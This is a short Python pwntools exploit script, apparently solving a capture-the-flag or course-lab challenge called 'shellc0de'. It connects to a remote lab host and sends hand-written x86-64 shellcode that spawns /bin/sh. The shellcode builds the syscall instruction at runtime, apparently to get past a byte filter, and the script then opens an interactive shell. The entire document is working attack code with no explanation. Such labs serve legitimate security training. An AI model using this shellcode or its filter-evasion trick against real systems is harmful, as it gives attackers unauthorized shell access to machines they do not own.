from pwn import *
import struct

local = False
elf = 'shellc0de' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else:
    ip = "sqlab.zongyuan.nctu.me"
    port = 6004
    r = remote(ip,port)

context.arch = 'amd64'

shell = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x48\x31\xc9\x66\xb9\x0e\x04\x66\x81\xc1\x01\x01\x66\x51\x49\x89\xe2\x41\xff\xe2'
#shell = '\xeb\xfe'

payload = shell
print(payload)
r.sendline(payload)
r.interactive()
